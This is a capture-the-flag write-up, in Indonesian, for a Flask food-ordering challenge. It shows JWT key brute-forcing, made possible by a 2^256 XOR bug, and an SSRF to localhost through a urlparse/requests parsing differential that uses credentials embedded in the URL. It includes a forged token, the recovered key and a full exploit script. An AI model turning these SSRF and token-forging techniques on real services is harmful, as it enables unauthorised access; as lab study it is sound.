# Fancy food notifications

Flag:

```text
GPNCTF{and_as_always_thE_PrOB13M_W45_dNS}
```

## Ringkasan

Challenge ini adalah aplikasi Flask untuk membuat order makanan. User mengirim `url`, lalu server akan melakukan request ke URL itu sebagai notifikasi ketika makanan selesai.

Target menariknya ada di endpoint `/vip-meal`. Endpoint ini hanya mengembalikan flag kalau:

1. request datang dari `127.0.0.1`;
2. header `Authorization` berisi JWT valid dengan claim `vip: true`.

Bug utamanya adalah kombinasi beberapa hal:

- JWT key dibuat dari `random.randbytes()` setelah `random.seed()` dengan seed yang entropy-nya kecil.
- Callback `/order` mengirim header `Authorization` ke URL user, jadi token normal bisa dileak lewat endpoint echo.
- `requests` bisa mengganti header `Authorization` menjadi Basic auth jika URL berisi credentials.
- Validasi hostname memakai `urllib.parse.urlparse()`, tetapi request final diproses oleh `requests` dengan normalisasi URL yang berbeda.

## Analisis Source

Di `app/app.py`, key JWT dibuat seperti ini:

```python
random.seed(f"...{secrets.randbelow(2^256)}...")
key = str(random.randbytes(32).hex())
```

Di Python, `2^256` bukan pangkat, tetapi XOR. Nilainya adalah `258`, jadi `secrets.randbelow(2^256)` hanya menghasilkan angka `0` sampai `257`. Artinya key JWT cuma punya 258 kemungkinan.

Endpoint `/vip-meal` melakukan check ini:

```python
if request.remote_addr != "127.0.0.1":
    return ..., 401

token = request.headers.get("Authorization", default="").split(" ")[-1]
token = base64.b64decode(token).decode()
token = ''.join(c for c in token if c.isalnum() or c in ['.', '=', '-', '_'])
decoded = jwt.decode(token, key, algorithms=["HS256"])
```

Jadi token yang diterima adalah base64 dari JWT, lalu karakter selain alnum, `.`, `=`, `-`, dan `_` dibuang.

Endpoint `/order` membuat callback:

```python
r = requests.get(
    url,
    headers={"Authorization": f"Bearer {generateToken(id)}"},
    allow_redirects=False,
)
```

Sebelum request, host divalidasi agar semua IP hasil resolve adalah global:

```python
addresses = socket.getaddrinfo(urlparse(url).hostname, 0)
for addr in addresses:
    if not ipaddress.ip_address(addr[4][0]).is_global:
        return REJECTED
```

## Leak Token Normal

Pertama saya kirim order ke endpoint echo:

```text
https://httpbin.org/anything
```

Response callback disimpan di `/notification/<id>`, dan di sana terlihat header yang dikirim server:

```text
Authorization: Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjJhWEFpT21aaGJITmxMQ0pwWkNJNkluVjFlREJ2TXpRM1pEQWlmUS5xMnVBZXRxb3BFdlBqQnhrd0dXYjkzNjU3NzRyYXBuU2t6Um1ZN0I1d1Vz
```

Base64 token itu berisi JWT:

```json
{"vip": false, "id": "uux0o347d0"}
```

Dengan token valid ini, saya brute-force 258 kemungkinan seed sampai signature cocok. Seed yang benar adalah varian `64`, dengan key:

```text
c4951992f5a6612d0afc3733ab334c7af799902cc9e99a943724968a9093dd30
```

Lalu saya buat JWT baru:

```json
{"vip": true, "id": "uux0o347d0"}
```

## Bypass Header Authorization

Masalah berikutnya: SSRF dari `/order` selalu mengirim header:

```text
Authorization: Bearer <token vip=false>
```

Tetapi library `requests` punya perilaku penting: jika URL berisi credentials, misalnya:

```text
http://user:pass@example.com/
```

maka `requests` akan menyiapkan Basic auth dan header `Authorization` bisa menjadi:

```text
Authorization: Basic base64(user:pass)
```

Ini cocok dengan parser `/vip-meal`, karena endpoint hanya mengambil bagian setelah spasi lalu melakukan base64 decode. Jika username di URL adalah JWT forged dan password kosong, Basic auth menjadi base64 dari:

```text
<jwt>:
```

Karakter `:` akan dibuang oleh filter token, sehingga yang tersisa adalah JWT forged.

## Bypass Host Validation

Payload URL final:

```text
http://<forged_jwt>:@127.0.0.1\@example.com/../vip-meal
```

Alasannya:

- `urlparse(url).hostname` melihat hostname sebagai `example.com`, sehingga validasi IP lolos karena `example.com` resolve ke IP global.
- `requests` menormalisasi URL tersebut menjadi request ke:

```text
http://127.0.0.1/vip-meal
```

- credentials `<forged_jwt>:` membuat header menjadi Basic auth yang berisi JWT forged.

Dengan begitu request callback masuk ke `/vip-meal` dari localhost dan membawa token `vip: true`.

## Script Inti

Potongan eksploit final:

```python
import re
import time
import urllib.parse
import requests

base = "https://smoked-brisket-stuffed-with-roasted-miso-ajss.gpn24.ctf.kitctf.de"
forged = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2aXAiOnRydWUsImlkIjoidXV4MG8zNDdkMCJ9.2-C1H7swW0YPGvXoqgeCdk4wAKo1uWUmgeKU0sVWsDE"

user = urllib.parse.quote(forged, safe="")
url = f"http://{user}:@127.0.0.1\\@example.com/../vip-meal"

r = requests.post(base + "/order", data={"url": url})
order_id = re.search(r"/notification/([a-z0-9]{10})", r.text).group(1)

while True:
    time.sleep(1)
    j = requests.get(base + "/notification/" + order_id).json()
    flag = re.search(r"GPNCTF\\{[^}]+\\}", j.get("message", ""))
    if flag:
        print(flag.group(0))
        break
```

Output:

```text
GPNCTF{and_as_always_thE_PrOB13M_W45_dNS}
```
